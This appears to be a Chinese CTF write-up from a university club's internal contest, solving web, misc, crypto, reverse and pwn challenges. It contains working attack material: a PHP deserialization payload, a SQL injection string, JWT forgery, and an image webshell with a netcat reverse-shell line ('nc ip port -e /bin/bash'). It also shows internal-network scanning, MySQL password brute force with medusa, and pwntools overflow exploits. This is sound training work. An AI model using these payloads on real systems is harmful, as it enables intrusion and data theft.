---
title: WUST内部赛（儿童节）wp
date: 2020-06-1
tags: 
- CTF 
- Web
categories: 
- CTF
---

WUST第二次内部赛 Writeup（儿童节快乐）

<!-- more -->

## Web



### 签到题

访问页面：

![t3S4JS.png](https://s1.ax1x.com/2020/05/31/t3S4JS.png)

猜密码，第一反应就是爆破，查看一下Hint

![t3SqZq.png](https://s1.ax1x.com/2020/05/31/t3SqZq.png)

4位纯数字，开不开心，高不高兴，直接爆破（手动输入也行，我没意见）

![t3SvJU.png](https://s1.ax1x.com/2020/05/31/t3SvJU.png)

![t3p9y9.png](https://s1.ax1x.com/2020/05/31/t3p9y9.png)

1314，输入进去，拿到flag

![t3pie1.png](https://s1.ax1x.com/2020/05/31/t3pie1.png)



### 我已备份好文件

> 根据上次的反馈，因此特地加了这道送分题。

题目说备份文件，发现是php，那就尝试常见的源码泄露的点，可以参考协会 `wiki` 另一篇文章的点：`https://wiki.w-ais.cn/2019/07/14/Web-In-CTF/#备份文件源码泄漏`

访问 `index.php.bak` 拿到源码：

```php
<?php
/*
./flag.php
*/
class HaveFun{
	public $Enjoy;
	public $Happy;
	public $keyboard;
    
	public function __construct($value1,$value2){
		$this->Enjoy = $value1;
		$this->Happy = $value2;
	}
    
	public function __wakeup(){ #
		if(preg_match('/flag/i', $this->keyboard)){
			$this->keyboard = "";
		}
	}
    
	public function __destruct(){
		//echo $this->keyboard;
		eval($this->keyboard);
	}

}

if(isset($_POST['happy'])){
	unserialize($_POST['happy']);
}
```

一个简单的反序列化，绕过 `__wakeup()` 就好了

```php
<?php
class HaveFun{
	public $Enjoy;
	public $Happy;
	public $keyboard;

	public function __wakeup(){
		if(preg_match('/flag/i', $this->keyboard)){
			$this->keyboard = "";
		}
	}

	public function __destruct(){
		//echo $this->keyboard;
		eval($this->keyboard);
	}
}

$a = new HaveFun();
$a->keyboard = "system('cat ./flag.php');";
echo serialize($a);
//O:7:"HaveFun":3:{s:5:"Enjoy";N;s:5:"Happy";N;s:8:"keyboard";s:25:"system('cat ./flag.php');";}
```

漏洞原理：当反序列化字符串中，表示属性个数的值大于其真实值(这里>3)，则跳过 `__wakeup()` 执行。

`O:7:"HaveFun":4:{s:5:"Enjoy";N;s:5:"Happy";N;s:8:"keyboard";s:25:"system('cat ./flag.php');";}`

漏洞影响版本：

PHP5 < 5.6.25

PHP7 < 7.0.10

传参，拿到flag

![t3pFdx.png](https://s1.ax1x.com/2020/05/31/t3pFdx.png)



参考链接：

https://www.freebuf.com/articles/web/167721.html

https://www.cnblogs.com/Mrsm1th/p/6835592.html

### 有点像甜饼

![t3pko6.png](https://s1.ax1x.com/2020/05/31/t3pko6.png)

一个登录界面，随便输入一些东西，会发现页面没什么变化，看一下Hint

提示说admin：那就admin进去

![t3pEFK.png](https://s1.ax1x.com/2020/05/31/t3pEFK.png)

返回这样，密码改为2，会发现有一点不同的回显；

看看cookie：

![t3pVJO.png](https://s1.ax1x.com/2020/05/31/t3pVJO.png)

这一看就是JWT，不用想了，找key



登录框能有什么漏洞，测试一下sql注入，发现密码框存在注入点；

fuzz一下，过滤了空格，引号（盲猜数字型输入，因为过滤了引号嘛）

常规的union注入即可，将空格换成/**/即可绕过：

```
username=admin&passwd=1/**/and/**/1=2/**/union/**/select/**/1,2,(select/**/group_concat(hint_key)/**/from/**/hint)#
```

![t3psYT.png](https://s1.ax1x.com/2020/05/31/t3psYT.png)



拿到密钥去 `https://jwt.io/` 进行更改，然后 cookie 伪造一下，拿到 flag：

![t3p0wq.png](https://s1.ax1x.com/2020/05/31/t3p0wq.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJwZXJtaXNzaW9uIjoidHJ1ZSJ9.Ze4cQbeD2BMP9S5CmidQ6UrszaRBlm7aaR7opHh_nzk
```

![t3pXnA.png](https://s1.ax1x.com/2020/05/31/t3pXnA.png)

另外这题还有一个非预期解，由于出题人的疏忽，题目环境自带的 `phpmyadmin` 并没有处理掉，直接进入 `phpmyadmin` 用初始密码登陆就能直接看数据库了。

![image-20200601010515131](https://gitee.com/ivenwings/md_img/raw/master/img/20200601010515.png)

参考链接：

https://www.freebuf.com/column/170359.html



### easyweb

>Author: 这道题目出着是想理解一下渗透的流程，算比较用心地去出题，比较遗憾，因为严格意义上来说没有人解出来，准备了很多 `hint`，但感觉前面没做到，后面的提示好像也派不上用场，灵感来自空指针的一次内部赛，那个比较难。这次主要考点还是在文件上传(内部训练)，后面的渗透比较刻意地去设置，也不算太难，过了文件上传有 `hint` 都可以秒解，题目比较贴心地给你准备好了一切，都是基本操作，主要是想熟悉 `nmap` 的基本使用及内网探测与爆破。

打开网页，一个文件上传，上传图片，会将图片显示出来，然后出现了两个不知道为什么会存在的东西：两首歌的歌词，注意到 `url` 发现有文件包含，`http://47.110.130.169:10001/view.php?article=song.php`，可以利用它来包含文件🐎，但同时也可以用伪协议读源码(这里没有过滤)，提示 `flag` 在 `/flag`，如果真的在，那么伪协议就能读 `flag` 了，这题就不用做了。

`http://47.110.130.169:10001/view.php?article=php://filter/convert.Base64-encode/resource=index.php`

```php
<title>Can you bypass?</title>
I have already give you shell, this challenge is too easy.
<br>
<form action="/index.php" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input type="file" name="upload_file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
<?php
    header('Content-type:text/html;charset=utf-8');
    function isImage($filename){
        $image_type = exif_imagetype($filename);
        switch ($image_type) {
            case IMAGETYPE_GIF:
                return "gif";
                break;
            case IMAGETYPE_JPEG:
                return "jpg";
                break;
            case IMAGETYPE_PNG:
                return "png";
                break;    
            default:
                return false;
                break;
        }
    }
    if (isset($_POST['submit'])) {
        $temp_file = $_FILES['upload_file']['tmp_name'];
        if (isImage($temp_file)) {
            $name = $_FILES['upload_file']['name'];
            $ext = substr(strrchr($name, '.'), 1);
            if (preg_match("/ph|htaccess/i", $ext)) {
                echo "illegal suffix!";
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
                $fn = md5(time());
                $dir = 'uploads/'.md5($ip);
                if(!is_dir($dir)){
                    mkdir($dir, 0777, true);
                }
                $img_path = $dir.'/'.$fn.'.'.$ext;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                } else {
                    echo '上传出错！';
                }
                if ($is_upload) {
                    echo '<img src="'.$img_path.'" alt="Image"/>';
                }
            }
        } else {
            echo 'not image!';
        }
    }
?>
<a href="/view.php?article=wind.php">夏天的风</a>
<br>
<a href="/view.php?article=song.php">歌·颂</a>
```

ban 了 `htaccess` 和 `ph` 后缀的所有文件，并且用 `exif_imagetype` 检测是否是图片，看样子只能上传图片。写入 `phpinfo()` 利用文件包含发现可以执行

`http://47.110.130.169:10001/view.php?article=图片路径`

可以直接在图片末尾写个马，也可以利用命令制作图片马：`copy shell.jpg /b + shell.php /a realshell.jpg`

这些在之前的直播培训中都有说到，接下来使用蚁剑连接或者反弹shell都可以

蚁剑方法：

![image-20200601011824402](https://gitee.com/ivenwings/md_img/raw/master/img/20200601011824.png)

在根目录找不到 `flag`，但是发现有一个 `hint.txt`

![image-20200601004446767](https://gitee.com/ivenwings/md_img/raw/master/img/20200601004446.png)

预期解是反弹shell，监听 `nc -lvp port`，写入马 `<?php exec("nc ip port -e /bin/bash"); ?>` ，包含了之后可以发现弹到了shell。

![image-20200526153521836](https://gitee.com/ivenwings/md_img/raw/master/img/20200526153521.png)

ls 一下可以看到当前的目录，我们去找一下 `/flag`，当然找不到，因为不在这个服务器上，但是可以找到一个 `hint.txt` 

![image-20200601004417726](https://gitee.com/ivenwings/md_img/raw/master/img/20200601004417.png)

flag 不在这台服务器，看样子接下来就是内网探测了，我们 `route -n` 可以看一下目前的网关。

![image-20200526153541496](https://gitee.com/ivenwings/md_img/raw/master/img/20200526153541.png)

用 `ifconfig` 可以看到当前主机的网络

![image-20200526153553563](https://gitee.com/ivenwings/md_img/raw/master/img/20200526153553.png)

`hint.txt` 已经说了善用工具，且题目非常贴心地安装了 `nmap`，于是 `nmap -sP 192.168.1.0/24` 扫描内网存活主机，发现 ip 为 `192.168.1.123` 的存活主机，因此那就是下一步需要的搞的机。

![image-20200526153648330](https://gitee.com/ivenwings/md_img/raw/master/img/20200526153648.png)

`curl 192.168.1.123` 和 `curl 192.168.1.110` 发现没有回显，当然因为没有开 http 服务，我们先扫描一下看看开放了什么端口，用 `nmap -p 1-65535 192.168.1.123`  `nmap -p 1-65535 192.168.1.110`来扫描全部端口，发现很贴心地只开了一个 `9997` 端口，那只有是它了。

![image-20200526153827321](https://gitee.com/ivenwings/md_img/raw/master/img/20200526153827.png)

![image-20200526153805961](https://gitee.com/ivenwings/md_img/raw/master/img/20200526153806.png)

直接 `nc 192.168.1.123 9997`  连上去，发现贴心地提醒了要以 admin 登陆，我们没有密码，另一个服务器贴心地刚好开了 mysql，那不难想到用户名密码在数据库里面，因此我们尝试爆破一下`mysql` 密码，这里没有提供字典，因此需要自己想办法把字典搞进去，可以将字典放在自己服务器，然后用 `wget` 或者 `curl`把字典带进去，当然蚁剑等工具也是可以的。这里又贴心地装了 `Medusa`，爆破 mysql 的软件常用是 `hydra` 和 `medusa` ，百度一下就知道了，没有装`hydra`，那用 `medusa`：

```sh
medusa -h 192.168.1.110 -u wust -P wordlists.txt -M mysql
```

![image-20200526154141877](https://gitee.com/ivenwings/md_img/raw/master/img/20200526154141.png)

爆出了密码 `iloveyou`，这里也安装好了 `mysql-client`，命令远程登陆：

```sh
mysql -uwust -p -h 192.168.1.110
mysql -uwust -piloveyou -h 192.168.1.110
```

我在测试的时候出现反弹 shell 的时候进行 mysql 交互是没有回显，其实这个点有点意外，一开始 debug 了好久，差点要改题目了，但是后来发现还是可以做的，可以用 `mysql -uwust -piloveyou -h 192.168.1.110` 连上去后，直接开始执行查询语句，然后输入一个错误的语句，报错后就会输出原本的信息了，原因应该是回显到缓冲区了，报错断开会话后就会显示信息.

![image-20200531133317526](https://gitee.com/ivenwings/md_img/raw/master/img/20200531133324.png)

![image-20200531133343348](https://gitee.com/ivenwings/md_img/raw/master/img/20200531133343.png)

当然如果你选择用工具连上去，蚁剑**终端**是不能创建 mysql，ssh 等交互式会话的，用数据库的模块：

![image-20200531133952593](https://gitee.com/ivenwings/md_img/raw/master/img/20200531133952.png)

也可以尝试冰蝎，一套操作都写好了。

![image-20200529234530994](https://gitee.com/ivenwings/md_img/raw/master/img/20200529234531.png)

也可以用数据库管理工具挂个代理就连上去，`navicat` 或者 `sqllog` 都可以直接查库。

查数据库：

![image-20200526154351359](https://gitee.com/ivenwings/md_img/raw/master/img/20200526154351.png)

查表：

![image-20200526154417752](https://gitee.com/ivenwings/md_img/raw/master/img/20200526154417.png)

然后直接查用户就可以了

![image-20200529235205910](https://gitee.com/ivenwings/md_img/raw/master/img/20200529235205.png)

就三个，找到对的一个回去登陆后发现有一行字：

`You take my shell, but my port is closed, my network is closed, everything is closed.`

提示了 `closed`，无论怎么输入都没有回显，也就关闭了标准输出，所以需要资源重定向。

提示也给出了源码：

```c
close(1); 
close(2); 
return shell(); 
//输出重定向
```

老套路，百度就有，理解一下就可以做了，也可以参考校赛 `pwn 题 closed` 的 `payload`， 一打就行

```sh
sh 1>&0
#这个点不算pwn的知识，是操作系统基本知识，原理还是得了解一下
```

根据说明 `flag` 在 `/flag`，直接读取即可：

![image-20200526154632416](https://gitee.com/ivenwings/md_img/raw/master/img/20200526154632.png)

## MISC

### 还是写题爽

出题人: 0bs3rver

其实出题想法是出题目好麻烦啊～

写写题，写不出来就去看WP，嫖一波知识，多爽啊，哎

拿到一个压缩包，打开是一个带密码的flag.7z和password文档，根据题目描述WTF想到Brainfuck密码（一点点脑洞），拿到这里解开https://www.splitbrain.org/services/ook

得到密码，解开可得一个二维码，但是定位块被我扣掉了，补上去一扫即可get flag。

flag{chu_ti_hao_ma_fan}

### Cry

​		是一个杰瑞笑哭的表情包。。。

​		查看属性，没啥发现。

​		丢进Winhex或者ida进行二进制分析。

![t8saZV.png](https://s1.ax1x.com/2020/06/01/t8saZV.png)

​		拉到最后发现flag：

![t8sdaT.png](https://s1.ax1x.com/2020/06/01/t8sdaT.png)



## CRYPTO

### Are u ok？

出题人: 0bs3rver

同拿到压缩包，打开是password文档和带密码压缩包，打开文档一看带=号，但其实并不是base64，考虑到是密码学分类，可能是一些乱七八糟的加密

需要尝试一波，使用的是AES，密钥是题目描述：nobody is ok.

即可得到密码，打开一看，又是乱七八糟的玩意，一大堆Ook，很明显就是这个加密，同样的在线网站解开，https://www.splitbrain.org/services/ook，即可get flag。

flag{I'm not ok, ok?}



### be@r

​		由熊大曰可以可以看出来是与熊论道编码，通过[在线解码](http://hi.pcmoe.net/index.html)

​		将熊大曰改为熊曰，解码得到flag

![t8sDG4.png](https://s1.ax1x.com/2020/06/01/t8sDG4.png)



## RE

### maze

根据题目名和题目描述可以猜到是迷宫类逆向

比较困难的地方可能是c++，这玩意ida打开挺难看的

程序逻辑是根据输入在8*8的方块内进行移动，一旦移动到 'Z' 位置就错了，而且最后需要移动到 'W' 位置，一共能移动十五次，只有一条道路可以进行选择，WSAD分别控制上下左右，输入就是flag

附个源码

```c++
#include<iostream>
using namespace std;

char a[64] = {
  'P', 'P', 'Z', 'Z', 'P', 'Z', 'Z', 'Z',
  'Z', 'P', 'Z', 'Z', 'P', 'P', 'P', 'Z',
  'Z', 'P', 'P', 'Z', 'Z', 'Z', 'P', 'Z',
  'Z', 'Z', 'P', 'Z', 'P', 'P', 'P', 'P',
  'Z', 'Z', 'P', 'Z', 'P', 'Z', 'Z', 'W',
  'Z', 'Z', 'P', 'P', 'P', 'Z', 'Z', 'Z',
  'Z', 'P', 'Z', 'Z', 'Z', 'P', 'P', 'P',
  'Z', 'P', 'Z', 'Z', 'Z', 'Z', 'Z', 'Z'
};
int a1=0;

int move(char m);

int main(){
    char c[20];
    cout << "Please input your flag:";
    cin >> c;
    for(int i = 0; i < 14; i++){
        if(move(c[i]) == 0){
            cout << "Wrong flag!" <<endl;
            return 0;
        }
    }
    move(c[14]);
    if(a[a1] != 'W'){
        cout << "Wrong flag!" <<endl;
        return 0;
    }
    cout << "Wow, you get right flag!" <<endl;
    return 0;
}

int move(char m){
    switch (m) {
        case 'W':
            a1 -= 8;
            break;
        case 'A':
            a1--;
            break;
        case 'S':
            a1 += 8;
            break;
        case 'D':
            a1++;
            break;
    }
    if(a1>0 && a1<63)
        if(a[a1] == 'P')
            return 1;
    return 0;
}
```

flag{DSSDSSSDDWWDDDS}

### ezbabyre

拿到程序首先试着运行一波，会让你解三个数学 (?) 问题，但是解开并没有flag（笑

扔进ida也看不出来啥，考虑到逆向分类，大概率是加壳，最常见的就是upx壳，linux下使用upx工具解开即可得到程序

看起来很多，其实很容易就能找到关键函数（没办法，不到40kb不能upx加壳，只能静态编译了

但是根据main函数走了一遍，啥也没有，继续寻找可以发现还有一个有函数名的函数从来没有调用过，打开一看，是输入和判定，推测这就是flag验证函数。

程序逻辑是根据奇偶分别进行加密

逆向算法也很简单，解开即可get flag

这里也附一个源码

```c
#include<stdio.h>

int check1(int x);
int check2(int x);
int check3(int x);
int flag(void);
int There(void);
char Flag[] = "flag is not here";

int main()
{
    int x;
    printf("I'll ask you some math questions, plz give me your answer.\n");
    printf("660 * x + 795 == 742 mod 2009\n");
    scanf("%d", &x);
    if(check1(x) == 0) return  0;
    
    printf("What is the twenty-five prime number?\n");
    scanf("%d", &x);
    if(check2(x) == 0) return  0;
    
    printf("Answer to the Ultimate Question of Life, the Universe, and Everything?\n");
    scanf("%d", &x);
    if(check3(x) == 0) return  0;
    
    flag();
    return 0;
}

int check1(int x){
    if((660*x+795)%2009 != 742){
        printf("Wrong answer!\n");
        return  0;
    }
    return 1;
}

int check2(int x){
    if(x != 97){
        printf("Wrong answer!\n");
        return  0;
    }
    return 1;
}

int check3(int x){
    if(x != 42){
        printf("Wrong answer!\n");
        return  0;
    }
    return 1;
}

int flag(){
    printf("Wow, You solved all the problems!\n");
    printf("But I have to say...\n");
    printf("%s :P\n", Flag);
    return 0;
}

char f[] = "egbbxr3r\\tLp\\b0o\\mf\\o,zZEgbb~";
int There(){
    char b[30];
    scanf("%s", b);
    for(int i=0; i<29; i++){
        if(i%2 == 0)
            b[i] = b[i]^0x3;
        else
            b[i] = b[i] - 5;
    }
    for(int i=0; i<29; i++){
        if(f[i] != b[i]){
            printf("Wrong!\n");
        }
    }
    return 0;
}
```

flag{w0w_yOu_g3t_real1y_Flag}



## PWN

### overflow_still

​		从题目可以看出来，这还是一个overflow的题目。

​		在Ubuntu终端执行命令来远程运行程序。

```sh
nc 121.41.113.245 10001
```

​		ELF文件丢入IDA分析，在左侧函数窗口可以找到两个主要函数：

​		main():![t8sHsI.png](https://s1.ax1x.com/2020/06/01/t8sHsI.png)

​		func():![t8sBiF.png](https://s1.ax1x.com/2020/06/01/t8sBiF.png)

​		程序的逻辑是，只要a1的值等于0xcafebabe就能拿到flag。但是程序正常流程中没有修改a1的地方。

​		不过找到了一个溢出点就是gets()。这个函数用起来虽然方便，但是并不对于输入长度进行检查，因此容易产生溢出，比较危险。

​		在s变量声明代码旁边的注释可以找到[ebp-28h]，说明s距离栈底0x28字节，再将光标放在a1上:

![t8swIU.png](https://s1.ax1x.com/2020/06/01/t8swIU.png)

​		所以思路就是：对s变量进行溢出，覆盖掉a1，让它等于0xcafebabe。而溢出的量通过计算得：-0x28-0x8=0x30

​		脚本如下：

```python
from pwn import *
p = remote("121.41.113.245",10001)
p.send('a'*0x30+p32(0xcafebabe))
p.interactive()
```

### rop_still

​		又一个rop，绝对的基础知识😂。

​		在Ubuntu终端执行命令来远程运行程序。

```sh
nc 121.41.113.245 10002
```

​		ELF文件丢入IDA分析，在左侧函数窗口可以找到三个主要函数，

​		main()：[![t8s5Je.png](https://s1.ax1x.com/2020/06/01/t8s5Je.png)](https://imgchr.com/i/t8s5Je)

​		nothing()：![t8sIRH.png](https://s1.ax1x.com/2020/06/01/t8sIRH.png)

​		what_is_this()：![t8sozd.png](https://s1.ax1x.com/2020/06/01/t8sozd.png)

​		发现system后门函数在what_is_this()中，而另外两个函数的正常执行流程是不会调用到这个函数的。

​		再检查有没有其他漏洞点，发现nothing中，对buf变量的读入会发生溢出。

​		和上个月的joke一样，利用到了栈帧的基础知识，对局部变量进行溢出，覆盖函数返回地址。

​		查看buf变量右边的注释可以看到[ebp-38h]，也就是说buf变量距离栈底0x38字节，而在栈帧上，栈底往下的第一个地址是用来存旧的ebp的，栈底往下第二个地址存的就是返回地址，也就是我们要溢出的地址。

![t8s7QA.png](https://s1.ax1x.com/2020/06/01/t8s7QA.png)

​		因为read函数允许读入0x200个字节，长度足够，所以我们用0x38个'a'填满buf，用p32(0)填满旧ebp，再用what_is_this()的地址填充原来的返回地址，这样nothing函数执行结束后，系统就会跳转到what_is_this开始执行。

​		脚本如下：

```python
from pwn import *
p = remote("121.41.113.245",10002)
elf = ELF('./rop_still')
what_addr = 0x08048562
p.recvuntil("Not thing here...")
payload='A'*0x38+p32(0)+p32(addr)
p.send(payload)
p.interactive()
```



### guess

​		在Ubuntu终端执行命令来远程运行程序。

```sh
nc 121.41.113.245 10000
```

​		发现貌似是一个猜数字的程序。

[![t8srRJ.png](https://s1.ax1x.com/2020/06/01/t8srRJ.png)](https://imgchr.com/i/t8srRJ)

​		丢ida分析一波。主要函数只有main函数。

![t8ssz9.png](https://s1.ax1x.com/2020/06/01/t8ssz9.png)

​		在程序中可以看到，v8变量是用随机数函数rand()函数生成的，每次的值都不一样。

​		此处要注意[伪随机数的知识](https://www.cnblogs.com/guihailiuli/p/4154416.html)。

​		大致的意思是，srand()和rand()函数可以配合使用生成随机数，rand()用来返回生成的值。rand()函数虽然能产生随机数，但是是通过srand的参数seed经过一定算法得出来的。换句话说，在函数算法不变的前提下，我们使用同样的参数seed，就可以得出同样的随机数。

![t8s6MR.png](https://s1.ax1x.com/2020/06/01/t8s6MR.png)

​		同样的自变量，同样的函数，就会得出同样的因变量。

​		所以srand()函数不变的前提下，我们只需要改变seed的值就可以控制最终得出的随机数。

​		在程序中我们看到srand()的参数，也就是seed，用的是a[0]，而a[0]在main函数第12行处被一个未初始化的变量赋值过，也就是说是个不确定的值。我们要做的就是覆写这个a[0]。

​		我们假设a[0]等于1，再求出来生成的随机数是多少。

​		写个C程序用srand函数算一算：

![t8sWdK.png](https://s1.ax1x.com/2020/06/01/t8sWdK.png)

[![t8sfIO.png](https://s1.ax1x.com/2020/06/01/t8sfIO.png)](https://imgchr.com/i/t8sfIO)

​		seed等于1是，rand()%100得出的结果为83。

​		双击a变量，发现它位于程序的bss段，也就是说这是一个全局变量。

!![t8scs1.png](https://s1.ax1x.com/2020/06/01/t8scs1.png)

​		而在它上方有另一个全局变量b，这个变量在main函数中被用来输入姓名。

![t8sgqx.png](https://s1.ax1x.com/2020/06/01/t8sgqx.png)

​		我们可以用read函数填充b变量，溢出到a，覆盖a[0]为1。

![t8sRZ6.png](https://s1.ax1x.com/2020/06/01/t8sRZ6.png)

​		b的地址为：0x08049B4C，a的地址为：0x08049B60。计算可知，两者相距0x14字节。

​		脚本如下：

```python
from pwn import *
p = remote("121.41.113.245",10000)
payload = 'a'*0x14 + p32(1)
p.recvuntil('First tell me who you are : \n')
p.sendline(payload)
p.recvuntil('Do you know what I am thinking?\n')
p.sendline(str(83))
p.interactive()
```





